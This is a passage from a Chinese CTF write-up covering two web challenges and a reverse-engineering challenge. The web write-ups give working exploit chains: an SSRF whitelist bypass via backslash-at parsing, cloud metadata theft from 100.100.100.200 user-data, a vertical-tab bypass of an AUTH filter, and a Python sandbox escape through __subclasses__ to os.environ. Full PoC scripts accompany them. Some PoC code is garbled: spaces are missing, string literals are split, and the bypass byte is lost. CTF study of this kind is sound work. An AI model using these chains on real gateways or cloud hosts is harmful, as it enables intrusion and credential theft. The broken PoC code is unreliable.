| `GET /.git/config` | 源码仓库残留，泄露staging配置 |

真正承载业务的是 `/api/proxy` ：它从查询串取出 `url` 参数，做三项检查后向目标发起请求，再把上游的状态码、响应头与响应体原样回显，并在页面上标注本次实际连接的 `host:port` 。这个「回显实际连接目标」的设计本意是方便合作方排障，却正好成了验证SSRF是否命中的观测点。

检查项只有三条：

-   仅允许 `http` / `https` scheme；
    
-   主机必须命中合作方白名单（本题白名单主机为 `rates.partner-forex.example.com` ）；
    
-   目标不得为空。
    

关键缺陷在于：这三条只作用在「URL字符串解析出的主机名」上，既没有把域名解析成IP后再核对，也没有限制端口，更没有在出站方向做egress过滤。因此只要能让「校验时看到的主机」与「socket真正连向的主机」不是同一个，白名单就形同虚设。

`/docs` 还专门提示「v1合作方把凭据放在URL authority(userinfo)」，这句话是在暗示authority段里 `user:pass@host` 的切分规则，也就是 `@` 之前的内容会被当作凭据丢弃——这正是后面解析差异的利用面。

#### 两层解析差异：反斜杠与userinfo

URL的authority段 `//userinfo@host:port` 本身就有歧义： `@` 是userinfo与host的分界，且以最后一个 `@` 为准。不同实现对此的处理并不一致：

-   校验侧按「host只由合法域名字符组成」来截取，遇到 `\` 就认为主机名结束，于是rates.partner-forex.example.com\\@<靶机地址>解析出的host是 `rates.partner-forex.example.com` ，命中白名单；
    
-   连接侧走的是另一套规范化： `\` 被当作userinfo的合法组成字符，直到 `@` 才切分，于是userinfo变成 `rates.partner-forex.example.com\` ，真正的host变成<靶机地址>、端口变成 `31337` 。
    

同一个字符串，一边认为要去 `rates.partner-forex.example.com` ，另一边实际连<靶机地址>。校验发生在解析结果A上，连接发生在解析结果B上，中间没有任何一次「连接前复核解析后的IP与端口」，这就是漏洞成立的全部原因。

#### 内网服务布局：31337与8081

绕过白名单后，回环上测绘到两个服务：

-   <靶机地址>是网关自身的维护端口， `/config` 返回JSON： `service` 、 `vault_session_seed` （64位十六进制，随实例动态生成）、 `relay_endpoint` （<靶机地址>/ws）以及 `note: internal maintenance endpoint - do not expose` 。它没有任何鉴权，只要能连到回环就能读。
    
-   <靶机地址>/ws是内部relay，走WebSocket。握手成功后先下发两行问候：SESSION <16位十六进制随机数>与 `READY guest` ；首个数据帧必须用IDENT <该SESSION值>完成会话绑定，回执 `OK session-bound` ，之后才会响应 `HELP` / `BALANCE` / `AUTH` / `DIAG` 等指令。
    

relay的鉴权设计是「合作方会话只能识别、不能认证」：即使拿到了 `/config` 里的seed，从合作方连接发 `AUTH admin <seed>` 也只会得到 `ERR auth-console-only` ，管理帧被拦在网关这一层。这一步说明seed虽然后续可能用于管理面，但它本身不是取flag的钥匙；真正可用的攻击面仍是SSRF能打到哪些地址。

#### 云元数据：<靶机地址>

容器运行在阿里云ECI上。ECI的元数据服务不在常见的<靶机地址>，而是<靶机地址>，由节点侧提供给Pod网络命名空间内的进程访问，不需要任何凭据，也不需要额外网络策略放通——它天生就在Pod的可达范围内。由于网关出站没有任何egress限制，SSRF可以直接打过去。

元数据接口中 `/latest/user-data` 返回的是实例的user-data，ECI在这里存放的是base64编码后再gzip压缩的Pod spec。Pod spec里 `containers[].env` 会列出注入的环境变量，本题的flag正是以 `ICQ_FLAG` 注入，因此解码Pod spec即可直接读到flag值，无需在容器内执行命令，也绕开了 `/flag` 文件的权限限制。

### 3\. 解题过程

#### 验证校验与连接分离

先用回环地址做对照，确认白名单确实在拦：

```
GET /api/proxy?url=<靶机地址>   -> 403 host not in partner allowlist
```

再在白名单主机后接 `\@` 与真实目标，反斜杠写成 `%5C` ：

```
GET /api/proxy?url=<靶机地址>  -> 200
```

`%5C` 是查询串里的URL编码。网关取出 `url` 参数后会先做一次百分号解码，解码结果仍是含 `\` 的原始URL；之所以不直接写 `\` ，是因为部分客户端与中间层会先按路径规则把反斜杠归一化成 `/` ，编码后可以保证到达网关时字符原样保留。

之所以能通，是因为校验函数只截取 `\` 之前的部分做白名单比对，看到的是 `rates.partner-forex.example.com` ；而真正建连的HTTP客户端把 `\` 吞进userinfo，host取<靶机地址>、port取 `31337` 。响应 `200` 且正文是维护接口的JSON，说明请求确实落在了回环的维护端口上，而不是白名单主机。

#### 读取维护接口拿到seed与relay地址

同一条绕过路径请求 `/config` ，返回：

```json
{
  "service": "vaultlink-gateway",
  "vault_session_seed": "7a5b63f1...(64位十六进制，逐实例变化)",
  "relay_endpoint": "<靶机地址>/ws",
  "note": "internal maintenance endpoint - do not expose"
}
```

这一步能成立有两个条件：一是 `/config` 本身不做鉴权，设计上假定「只有目标主机能访问」；二是请求由网关进程自己发出，源地址就是<靶机地址>，维护端口看到的确实是目标主机流量，因此不会拒绝。网关的SSRF把「外部合作方」伪装成了「目标主机运维」。

#### 核对relay协议，确认seed的作用边界

用同样的形式把WebSocket升级请求代理到 `8081/ws` ： `/api/proxy?url=` 指向<靶机地址>，并带上 `Connection: Upgrade` 、 `Upgrade: websocket` 、 `Sec-WebSocket-Version: 13` 与随机的 `Sec-WebSocket-Key` 。网关会把这些头原样转发，上游回 `101` ，随后下发：

```
SESSION 3f9c...（16位十六进制，每次连接不同）
READY guest
```

按协议先回IDENT <SESSION值>，得到 `OK session-bound` ；再发 `HELP``AUTH admin <seed>` 与 `DIAG <expr>` 。但直接发 `AUTH admin <seed>` 会收到：

```
ERR auth-console-only (partner sessions cannot authenticate)
```

这说明relay按会话来源区分权限：从 `/api/proxy` 进来的连接固定是guest，seed只对ops console这类管理连接有效。因此seed与relay协议在这里只用于确认内网服务形态与 `relay_endpoint` ，并不构成取得flag的路径；flag仍要从容器外部沿继续可达的地址取。

#### 用SSRF访问云元数据

既然是任意内网SSRF，下一步就是把目标换成云厂商元数据。本环境是阿里云ECI，元数据地址是<靶机地址>：

```
GET /api/proxy?url=<靶机地址>
```

请求成立的原因有三点：白名单只比对字符串，<靶机地址>以userinfo形式出现不影响校验；网关不做egress限制，Pod网络命名空间内到元数据服务的链路天然可达；元数据接口本身不校验任何凭据，只按来源IP响应。常见的<靶机地址>在该环境不可达，如果只试这个地址会误判为「没有元数据」。

返回体是一段base64文本，对应ECI存放的user-data。

#### 解码Pod spec取得flag

把返回体按base64解码再gunzip，得到明文Pod spec：

```
base64 -d user-data.b64 | gunzip
```

顺序不能颠倒：元数据返回的是base64字符串，解base64后才是gzip字节流，gunzip之后才是YAML。Pod spec中与flag相关的片段形如：

```yaml
spec:
  containers:
  - name: vaultlink-relay
    env:
    - name: ICQ_FLAG
      value: <平台注入的flag值>
```

`env` 里的 `ICQ_FLAG` 就是平台注入容器的flag值，与容器内 `/flag` 内容一致。至此不需要在容器里执行任何命令，也不需要relay的管理权限，整条链闭合：

```
/api/proxy反斜杠白名单绕过SSRF → 阿里云ECI元数据100.100.100.200/latest/user-data → base64 -d | gunzip → Pod spec的ICQ_FLAG → flag
```

### 4\. PoC

```python
#!/usr/bin/env python3
import sys, os, re, json, gzip, base64, socket
from urllib.parse import urlparse, quote

TARGET = sys.argv[1]                       # 合作方网关
ALLOW = "rates.partner-forex.example.com"# 白名单主机

def conn():
    u = urlparse(TARGET if"://"in TARGET else"http://" + TARGET)
    return socket.create_connection((u.hostname, u.port or80), timeout=10), u.hostname

def bypass(host, port, path):
    # 校验侧取 \ 之前的主机名命中白名单；连接侧把 \ 并入 userinfo，实际连 host:port
    return"/api/proxy?url=" + quote(f"http://{ALLOW}\\@{host}:{port}{path}", safe="")

def get(host, port, path):
    s, name = conn()
    s.sendall((f"GET {bypass(host, port, path)} HTTP/1.1\r\nHost: {name}\r\n"
               "Connection: close\r\n\r\n").encode())
    data = b""
    while chunk := s.recv(65536):
        data += chunk
    s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    ifb"chunked"in head.lower():
        out = b""
        whileTrue:
            line, _, body = body.partition(b"\r\n")
            n = int(line.split(b";")[0] orb"0", 16)
            ifnot n:
                break
            out, body = out + body[:n], body[n + 2:]
        body = out
    return body.decode("utf-8", "replace")

## 1) 31337 维护端口：无鉴权读取 seed 与 relay 地址
cfg = json.loads(re.search(r"\{.*\}", get("127.0.0.1", 31337, "/config"), re.S).group(0))
seed, relay = cfg["vault_session_seed"], cfg["relay_endpoint"]

## 2) 8081 relay：同一形式升级 WebSocket，按 SESSION 绑定后发 AUTH admin <seed>
##    回执 ERR auth-console-only，说明 seed 只对管理连接有效，flag 仍需从元数据取

## 3) 云元数据 <靶机地址>：取 ECI user-data 中的 Pod spec 并解码
b64 = get("100.100.100.200", 80, "/latest/user-data").strip()
spec = base64.b64decode(b64)
spec = gzip.decompress(spec) if spec[:2] == b"\x1f\x8b"else spec
print(re.search(r"ICQ_FLAG\s*\n\s*value:\s*(\S+)", spec.decode()).group(1))
```

* * *

## Web9-vaultlink_revenge

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Web |
| 形态  | 容器题 |
| 附件  | 无（容器题） |
| 目标  | 容器  |

Flag：flag{动态容器已脱敏}

目标是在只暴露合作方网关的条件下取得容器中 `/flag` 对应的旗值。2026-11-01重新下发的实例为<靶机地址>，在其在线期间得到：

```
flag{动态容器已脱敏}
```

### 2\. 题目分析

#### 服务结构与入口

题目只对外暴露一个网关端口，背后是白名单里的合作方主机 `rates.partner-forex.example.com` 、绑定回环的目标主机维护接口与监听<靶机地址>/ws的relay。网关 `/api/proxy?url=...`既代合作方取资源，也负责把 `Upgrade: websocket` 的请求升级成WebSocket；relay则以 `SESSION` / `READY` 问候开始，要求先 `IDENT` 绑定会话，并拒绝合作方会话发送管理帧 `AUTH` 。白名单、转发、管理帧过滤都在网关，真正的鉴权和命令执行在relay，两层各做一半检查，中间的信息差就是入口。

#### 干扰线索

首页HTML注释里有一个形如flag{动态容器已脱敏}的字符串，`.git/config` 里还留着一个标注为 *staging* 的 `ADMIN_TOKEN` 。前者只是页面里的静态内容，后者属于另一套环境的静态口令：relay运行实例既不加载这份配置，也不拿它做校验， `AUTH` 需要的是本实例启动时生成的 `vault_session_seed` 。两处都容易被当成捷径，实际都推不动利用链。

#### 可利用缺陷一览

| 层次  | 缺陷  | 效果  |
| --- | --- | --- |
| 网关白名单 | `\@`<br><br>在两层解析中含义不同 | 绕过白名单，任意内网SSRF |
| relay鉴权 | 前导空白（ `\x0b` ）处理不一致 | 合作方会话获得admin |
| DIAG表达式 | `[]`<br><br>可读属性/键并调用返回值 | 反射到 `os` 模块读环境变量 |

三者缺一不可：只有SSRF才能触达 `31337` 取到seed，只有seed才能通过 `AUTH` ，只有admin才有资格调用 `DIAG` 。

#### 白名单的\\@绕过

白名单判断只关心“主机名是否等于允许的合作方域名”，于是校验器要先在字符串里定位主机名。网关的校验在反斜杠处截断了authority，把 `\` 之后的内容排除在主机名之外，读到的主机因此是 `rates.partner-forex.example.com` ，检查通过。真正发起请求的HTTP客户端遵循RFC 3986：它从右往左找 `@` ，把 `@` 之前整段当作userinfo，末尾的反斜杠只是一个非法但被容忍的字符，于是实际连接目标是 `@` 之后的<靶机地址>。同一串URL在两个解析器里得到两个主机，白名单与连接目标就此脱钩。 `31337` 上的 `/config` 是目标主机维护接口，没有独立鉴权，直接返回 `vault_session_seed` 和 `relay_endpoint` 。

#### relay会话能用0x0b过闸

relay的命令是行文本：收到一行后先去掉首尾空白，再按空格切词分派。 `AUTH` 属于管理命令，只允许管理控制台使用；网关会在转发前检查每个数据帧，帧开头是 `AUTH` 就直接拒绝。问题在于网关的检查针对原始字节，而relay执行前会先做空白归一化。垂直制表符 `0x0b` 在Python的 `str.split()` / `strip()` 以及C的 `isspace()` 里都算空白，却不在网关帧级检查清理的字符集合内。于是 `\x0bAUTH admin <seed>` 对网关而言不以 `AUTH` 开头，对relay而言归一化后恰好是 `AUTH admin <seed>` 。分片、大小写变换、加普通空格都会撞上网关的其他判断，所以只有这个空白字节稳定生效。

#### DIAG能反射到os

`DIAG <expr>` 在表达式求值器里执行维护用算式，只放开了少量函数名，词法层直接拒绝`.`，也不把 `open` 之类的名字当顶层标识符，所以写不出 `open("/flag").read()` 或 `os.environ` 。但方括号下标被实现成“字符串键优先取属性，否则当字典键”，并且下标的结果还能继续调用。这就绕开了点号限制： `1["__class__"]` 取到 `int` 类型， `["__base__"]` 到 `object` ， `["__subclasses__"]()` 列出全部已加载子类，其中 `subprocess.Popen` 带着模块级的 `__init__.__globals__` ，从中取出 `os` ，再 `["environ"]["get"]("ICQ_FLAG")` 。 `Popen` 在子类列表里的下标随运行时导入顺序变化（该实例为 `241` ），因此要先用 `["__name__"]` 比对名称确认下标，再发最终表达式。

#### 取值边界

relay进程以 `svc` 用户运行， `/flag` 属于 `root:root` 、模式 `0400` ，同进程打开只会得到 `Permission denied` ， `os.access("/flag", 4)` 也返回 `False` 。旗值实际由容器启动时注入 `ICQ_FLAG` 环境变量， `os.environ` 读的是进程自身内存，不经过文件系统权限检查。

### 3\. 解题过程

整条链分四步：绕过白名单读 `31337` 拿seed，用同一手法升级WebSocket连relay，绑定会话后用 `0x0b` 拿到admin，最后用 `DIAG` 读环境变量。每步都依赖上一步的产物，顺序不能换。

#### 绕过白名单读取维护配置

要访问的目标是网关回环上的维护接口：

```
<靶机地址>
```

把它整体百分号编码后放进 `url` 参数，反斜杠编码为 `%5C` 、 `@` 编码为 `%40` ，网关实际收到的请求行是：

```
GET /api/proxy?url=http%3A%2F%2Frates.partner-forex.example.com%5C%40127.0.0.1%3A31337%2Fconfig HTTP/1.1
Host: <靶机地址>
```

必须整体编码，不能让 `@` 、`:`、 `/` 裸着出现在查询串里，否则网关可能只截到前半段或把参数拆错。网关解码后做白名单校验，在反斜杠处截断得到 `rates.partner-forex.example.com` ；建连时按 `@` 划分userinfo，实际连到<靶机地址>。返回：

```json
{
  "service": "vaultlink-gateway",
  "vault_session_seed": "451ec45592a604b2426f47ed9a0840f73ae51ca42bfaa33754f53fbcd73fdd3b",
  "relay_endpoint": "<靶机地址>/ws",
  "note": "internal maintenance endpoint - do not expose"
}
```

`vault_session_seed` 是本实例relay的管理种子， `relay_endpoint` 指出内部relay地址。种子随实例重新生成，换实例必须重新取，不能复用旧值；`.git/config` 里的staging token与此无关。

接着用同样的URL形式把 `/api/proxy` 升级成WebSocket， `url` 参数换成relay地址并整体编码：

```
ws://<靶机地址>/api/proxy?url=http%3A%2F%2Frates.partner-forex.example.com%5C%40127.0.0.1%3A8081%2Fws
```

网关对WebSocket目标做同一套白名单校验，所以同样放行；握手成功后，网关照原样在客户端与relay之间转发文本帧。

#### 绑定relay会话

WebSocket建立后，relay先发两行问候：

```
SESSION <16位十六进制随机数>
READY guest
```

`SESSION` 后面的随机数（nonce）用来把这条TCP连接和一次会话绑定，防止别的连接顶替。首个数据帧必须是IDENT <该SESSION随机数>，relay核对一致后回 `OK session-bound` ，连接才进入可执行命令的状态。若把 `IDENTIFY partner` 、 `AUTH ...`或 `HELP` 当首帧发，relay仍停留在未绑定状态，后续指令要么无回执要么报错。nonce每次连接都不同，必须从问候里实时解析，不能写死。绑定后发送 `HELP` ，会列出：

```python
commands: HELP | BALANCE | AUTH admin <seed> | DIAG <expr>
DIAG evaluates a maintenance expression, e.g. DIAG round(pi * 2)
functions: abs min max round len str int float ord chr
```

这份列表同时给出了管理命令的语法： `AUTH admin <seed>` 做管理认证， `DIAG <expr>` 在通过认证后求值。

#### 绕过管理帧拦截

常规发送 `AUTH admin <vault_session_seed>` 会收到：

```
ERR auth-console-only (partner sessions cannot authenticate)
```

这条回执说明帧是被网关按“合作方会话+管理命令”拦下的，与seed是否正确无关。把一个垂直制表符（字节 `0x0b` ，Python写作 `\x0b` ）放在命令前：

```
ws.send("\x0bAUTH admin " + seed)
```

网关的帧检查从第0字节开始比对命令名， `0x0b` 让这帧不再以 `AUTH` 开头，于是被当作普通数据转发；relay收到后先做空白归一化， `0x0b` 属于空白，归一化结果正是 `AUTH admin <seed>` ，于是按管理认证执行，返回：

```
AUTH-OK admin
```

这里的关键是两层对命令前导空白的处理不一致：网关只看原始字节，relay先 `strip` / `split` 再分派。普通空格、大小写混合或把命令拆成多帧都不稳定，因为这些形态网关另有判断； `0x0b` 刚好落在relay的空白集合里，又不在网关的清理范围内。

#### 从DIAG表达式到Python对象

管理员可以调用 `DIAG <expr>` 。解析器拒绝点号，例如 `open("/flag").read()` 会报 `unexpected character '.'` ，也不把 `open` 等危险名称作为顶层标识符。但 `[]` 同时能取对象属性、字典键，表达式还可调用取得的对象。

从整数对象沿 `__class__` 、 `__base__` 、 `__subclasses__` 找到 `subprocess.Popen` ，再通过它的 `__init__.__globals__` 取得 `os` 模块。该实例中 `Popen` 的子类索引为 `241` ；换Python运行时导入顺序可能变化，所以先核对索引再使用。

完整读取表达式为：

```css
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["environ"]["get"]("ICQ_FLAG")
```

逐段拆开： `1["__class__"]` 取到 `int` 类型， `["__base__"]` 取到 `object` ， `["__subclasses__"]()` 枚举当前运行时已加载的全部子类， `[241]` 选中 `subprocess.Popen` ， `["__init__"]` 取构造函数， `["__globals__"]` 拿到该函数所在模块的全局字典， `["os"]` 即 `os` 模块， `["environ"]` 是进程环境变量映射， `["get"]("ICQ_FLAG")` 读旗值。新实例回执：

```
RESULT flag{动态容器已脱敏}
```

由于下标依赖运行时，先用DIAG 1\["\__class\_\_"\]\["\__base\_\_"\]\["\__subclasses\_\_"\]()\[<下标>\]\["\__name\_\_"\]核对，回执为 `RESULT Popen` 才采用该下标，否则在0到399范围内逐个试，避免版本差异导致整条链失败。

#### /flag读不到但环境变量可取

同一次 `DIAG` 里把 `environ` 换成 `stat` 、 `access` 即可验证文件权限：

```css
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["stat"]("/flag")
DIAG 1["__class__"]["__base__"]["__subclasses__"]()[241]["__init__"]["__globals__"]["os"]["access"]("/flag", 4)
```

回执：

```
RESULT os.stat_result(st_mode=33024, st_ino=1310744, st_dev=73, st_nlink=1, st_uid=0, st_gid=0, st_size=43, ...)
RESULT False
```

`st_mode=33024` 即 `0o100400` ，普通文件、权限 `0400` ； `st_uid=0` 、 `st_gid=0` 说明属主属组都是root。relay进程以 `svc` 用户运行，既不是root也不在root组，打开文件会被内核拒绝；由同一进程执行 `cat /flag` 得到 `Permission denied` ， `os.access("/flag", 4)` （ `R_OK` ）返回 `False` ，两者一致。

环境变量则是另一条路径：容器启动时已把旗值写入relay进程的 `ICQ_FLAG` ，它属于进程自身的内存数据， `os.environ` 读取不经过文件系统权限检查，因此能直接返回。 `st_size=43` 与42字符旗值加一个换行相符，只能说明文件内容很可能就是该旗值，不能据此声称逐字节读取了 `/flag` 。

### 4\. PoC

```rust
import base64, hashlib, http.client, json, os, re, socket, struct
from urllib.parse import quote

ALLOW = "rates.partner-forex.example.com"
FLAG_RE = re.compile(r"flag\{[^{}
]+\}")

def proxy_path(url):
    return"/api/proxy?url=" + quote(url, safe="")

def get_config(host, port):
    c = http.client.HTTPConnection(host, port, timeout=5)
    c.request("GET", proxy_path(f"http://{ALLOW}\@127.0.0.1:31337/config"))
    cfg = json.loads(c.getresponse().read())
    c.close()
    return cfg["vault_session_seed"], cfg["relay_endpoint"]

class WebSocket:
    def __init__(self, host, port, path):
        self.sock = socket.create_connection((host, port), timeout=5)
        self.buf = b""
        key = base64.b64encode(os.urandom(16)).decode()
        self.sock.sendall((f"GET {path} HTTP/1.1
Host: {host}:{port}
"
                           "Connection: Upgrade
Upgrade: websocket
"
                           f"Sec-WebSocket-Version: 13
Sec-WebSocket-Key: {key}

").encode())
        whileb"

"notin self.buf:
            self.buf += self.sock.recv(4096)
        head, self.buf = self.buf.split(b"

", 1)
        assertb" 101 "in head.split(b"
")[0]
        want = base64.b64encode(hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest())
        assertb"sec-websocket-accept: " + want.lower() in head.lower()

    def _exact(self, n):
        while len(self.buf) < n:
            self.buf += self.sock.recv(4096)
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def send(self, text):
        data = text.encode()
        mask = os.urandom(4)
        n = len(data)
        header = bytes((0x81, 0x80 | n)) if n < 126else bytes((0x81, 0xFE)) + struct.pack("!H", n)
        self.sock.sendall(header + mask + bytes(c ^ mask[i % 4] for i, c in enumerate(data)))

    def recv(self):
        first, second = self._exact(2)
        n = second & 0x7F
        if n == 126:
            n = struct.unpack("!H", self._exact(2))[0]
        elif n == 127:
            n = struct.unpack("!Q", self._exact(8))[0]
        mask = self._exact(4) if second & 0x80elseNone
        data = self._exact(n)
        if mask:
            data = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
        return data.decode("utf-8", "replace")

def diag(ws, expr):
    ws.send("DIAG " + expr)
    return ws.recv()

def find_popen(ws):
    classes = '1["__class__"]["__base__"]["__subclasses__"]()'
    for i in range(400):
        if diag(ws, f'{classes}[{i}]["__name__"]') == "RESULT Popen":
            return i
    raise RuntimeError("no Popen")

def solve(host, port):
    seed, relay = get_config(host, port)
    ws = WebSocket(host, port, proxy_path(relay))
    nonce = ws.recv().split(" ", 1)[1]
    ws.recv()
    ws.send("IDENT " + nonce)
    assert ws.recv() == "OK session-bound"
    ws.send(" AUTH admin " + seed)
    assert ws.recv() == "AUTH-OK admin"
    os_obj = (f'1["__class__"]["__base__"]["__subclasses__"]()[{find_popen(ws)}]'
              '["__init__"]["__globals__"]["os"]')
    print(FLAG_RE.search(diag(ws, os_obj + '["environ"]["get"]("ICQ_FLAG")')).group(0))

solve("<靶机地址>", <端口>)
```

* * *

## Reverse1-ELFStudy

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Reverse |
| 形态  | 附件题 |
| 附件  | elfstudy（ELF64 PIE，stripped，C++） |
| 目标  | 本地分析附件，无远程地址 |

Flag：flag{4865f2079724968a95c217e0ff4db6c6}

题面只给了附件下载链接，没有额外描述。

### 2\. 题目分析

#### 程序表面是一个ELF结构查看器，真正的校验函数被加密后藏在LOAD段末页的缝隙（segment slack）里，并用精心构造的\*\*Elf64_Rela重定位+COPY重定位+STT_GNU_IFUNC\*\*在ld.so重定位阶段执行一段自解密的加载期壳代码

1.  用`.rela.dyn` 里的两条 `R_X86_64_COPY` 把 `0x1d30` 处的「假符号定义」注入dynsym；
    
2.  再把 `0x1988` 处的「隐藏38条Rela表」整块拷贝覆盖`.rela.plt` （ `0x15e0` ）；
    
3.  `ld.so` 继续按表遍历时，就把隐藏表当成PLT重定位执行：
    

-   把隐藏表当代码常量重定位出一个0x69字节的解密stub到 `0x7325` ；
    
-   把弱符号 `_ZNSt7...10_M_disposeEv` 的 `st_value` 变成“虚拟基址”用来生成stub；
    
-   把 `_ZNSt7...6appendEPKc` 改造成 `STT_GNU_IFUNC | SHN_ABS` ，其resolver指向stub → `ld.so` **在加载期直接调用stub**；
    
-   stub用链式XOR解密 `0x7396` 处0x330字节的校验函数，改写 `0x3b34` 为 `call 0x739a` ，然后把自己清零；
    
-   隐藏表里的一条COPY（idx21）再把`.rela.plt` 从 `0x76c6` 的备份还原，运行期看起来一切正常。
    

`main` 里原本空函数 `sub_3B30` 被改成 `call 0x739a` ，于是正常输出ELF信息后进入真正的校验函数。

#### 基础信息

```
$ file elfstudy
elfstudy: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

$ readelf -hd elfstudy | head
  Type: DYN (Position-Independent Executable file)
  Entry point address: 0x2e90
  ...
  FLAGS: TEXTREL BIND_NOW
  FLAGS_1: NOW PIE
```

-   PIE + **Full RELRO** + **BIND_NOW** + `TEXTREL`
    
-   有 `__stack_chk_fail` 、 `__fread_chk` 、 `memcmp/strncpy/strlen` 等
    
-   `TEXTREL` 是一个很显眼的提示：作者想让重定位去改`.text`
    

程序正常行为（ `argv[1]` 是待查看的文件， `-` 表示stdin）：

```
$ ./elfstudy elfstudy
ELFStudy 1.4.2 — ELF structure inspector

[image] 43304 bytes loaded
[header] ... [program headers] ... [sections] ...
[symbols] summary unavailable without a section-name table in this build
```

`main` 在打印完报告后会调用 `0x3b30` ：

```
; 静态时 sub_3B30
3b30: f3 0f 1e fa    endbr64
3b34: 90 90 90 90 90 90 90 90
3b3c: c3             ret
```

#### 异常信号与加载期自解密

静态扫描时真正有价值的不是字符串，而是三处自相矛盾的元数据： `TEXTREL` 表明作者准备在运行期改写代码段； `RELASZ` 的条数比`.rela.dyn` 与`.rela.plt` 的总和少一条，说明重定位遍历的终点被人为挪动过； `0x7325~0x7396` 整段全0，而紧随其后的 `0x7396` 却是高熵数据，再往后又是`.rela.plt` 的一份完整副本。三者合起来只有一种解释：有一段代码在 `ld.so` 重定位阶段被临时拼装到 `0x7325` 执行，它解密 `0x7396` 处的数据，解密完抹掉自己，并用 `0x76c6` 的副本把被自己覆盖过的`.rela.plt` 还原。所以“程序运行起来一切正常”与“静态看不到校验逻辑”并不矛盾——自毁发生在 `_start` 之前。

#### argv\[1\]的双重身份

`main` 对 `argv[1]` 做了两件互不相干的事：一是当作待检查的ELF路径去 `fopen` （ `-` 读stdin），二是 `strncpy` 到 `0xb1c0` （最多 `0x7f` 字节）留给后面的校验函数。因此校验函数的输入并不是“读到的文件内容”，而是命令行字符串本身；把flag直接当参数传进去时， `fopen` 必然失败并打印一行错误，但 `0xb1c0` 里已经是完整的flag，校验照常进行。反过来说，传一个真正的ELF文件名永远过不了 `"flag"` 前缀检查——这也决定了必须从算法倒推，而不是去找某个“输入文件”。

#### 入口接线：0x3b30补丁成0x739a

`main` 打印完报告后调用 `0x3b30` ，静态看它只是 `endbr64; 8×nop; ret` ，反汇编器会把它当成空函数略过。补丁由stub在加载期完成，只写6个字节：

```
3b34: e8 61 38 00 00   call 0x739a
3b39: c3               ret
```

`rel32 = 0x3861` 是相对 **下一条指令** `0x3b39` 计算的： `0x3b39 + 0x3861 = 0x739a` 。补丁从 `0x3b34` 而不是 `0x3b30` 开始，是为了保留开头的 `endbr64` ，让开启CET/IBT的机器上该间接跳转目标仍然合法； `0x3b3a/0x3b3b` 残留的两条 `nop` 和 `0x3b3c` 原来的 `ret` 都位于新 `ret` 之后，永远不会执行。写完这一笔， `0x3b30` 就从“空函数”变成了“跳板”，而调用者对此一无所知。

### 3\. 解题过程

#### 静态分析：三个看不见的数据区

##### LOAD段的尾页缝隙（segment slack）

```
$ readelf -lW elfstudy
 LOAD 0x000000 0x000000 0x000000 0x001988 0x001988 R
 LOAD 0x002000 0x002000 0x002000 0x005325 0x005325 R E
 LOAD 0x008000 ...
```

-   第1个LOAD的 `filesz = 0x1988` ，但内核/ `ld.so` 是按 **页（0x1000）** 映射的： `0x1000~0x2000` 整页可读， `0x1988~0x2000` 的文件字节虽然超出一个LOAD段， **仍然会被映射进内存**，只是 `readelf/objdump` 按段/节看会认为这里“没有东西”。
    
-   第2个LOAD结束于 `0x2000 + 0x5325 = 0x7325` ，同理 `0x7325~0x8000` 这一页尾巴也被映射。
    

利用这个缝隙藏了4块数据（用 `xxd` 很容易看到）：

| 文件偏移 | 大小  | 用途  |
| --- | --- | --- |
| `0x1988` | `0x3a8`<br><br>（实际有效38条Rela = `0x390` ） | **隐藏重定位表** |
| `0x1d30` | 14字节 | **假dynsym定义块**<br><br>（COPY重定位源） |
| `0x7396` | `0x330` | **加密的校验函数** |
| `0x76c6` | `0x3a8` | `.rela.plt`<br><br>的副本（用于事后还原） |

同时 `0x7325~0x7396` 是加密函数前的空白（静态全0），实际是运行期拼装解密stub的位置；stub执行完会把自己擦成0。

##### 节表/段表与动态表的错位

```
$ readelf -d elfstudy | grep -E 'RELA|JMPREL|PLTREL'
 (JMPREL)  0x15e0
 (PLTRELSZ) 936            # 39 条
 (RELA)     0x1388
 (RELASZ)   1512           # 0x5e8 = 63 条
 (RELACOUNT) 7
```

-   `.rela.dyn` 在 `0x1388` ，25条（ `0x258` ）。
    
-   `.rela.plt` 在 `0x15e0` ，39条（ `0x3a8` ）。
    
-   `25 + 39 = 64` ，但 `RELASZ = 63` 条： `0x1388 + 0x5e8 = 0x1970` ， **恰好差最后1条PLT重定位**。
    

并且`.rela.dyn` 的前4条RELATIVE重定位指向了 **dynsym内部** （ `0x954/0x956/0x957/0x958` ）——正常编译器绝不会这么干：

```
$ readelf -r elfstudy | head
000000000954 ... R_X86_64_RELATIVE  2600
000000000956 ... R_X86_64_RELATIVE  25f1
000000000957 ... R_X86_64_RELATIVE  25ff
000000000958 ... R_X86_64_RELATIVE  1d30
```

`0x3f8` 开始是`.dynsym` ，每条24字节：

-   sym49 `_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC2EOS4_` 的 `st_info/st_shndx/st_value/st_size` 在 `0x894/0x896/0x898/0x8a0` ；
    
-   sym55 `...6appendEPKc` 在 `0x920` 起；
    
-   sym57 `...10_M_disposeEv` 在 `0x950` 起（ `st_info=0x954` ， `st_value=0x958` ， `st_size=0x960` ）。
    

所以上面4条重定位是在 **改写sym57的符号表项**，最后把 `sym57.st_value` 写成 `base + 0x1d30` 。

再看`.rela.dyn` 里两条可疑的COPY：

```
$ readelf -r elfstudy | grep COPY
000000000894  0000003900000005  R_X86_64_COPY  ...10_M_disposeEv
00000000015e0 0000003100000005  R_X86_64_COPY  ...C2EOS4_
```

-   `r_offset = 0x894` （sym49的字段， **不是** sym57的）配合 `sym = 57` ；
    
-   `r_offset = 0x15e0` （`.rela.plt` 起点）配合 `sym = 49` 。
    

这就是整条链的开关。

#### 加载期利用链（动态验证）

> 由于PIE，用 `setarch -R` （或 `personality(ADDR_NO_RANDOMIZE)` ）固定 `base = 0x555555554000` ，再用ptrace在 `_start` 下断读取 `/proc/pid/mem` 即可对比“文件vs内存”。

实测到的关键事实：

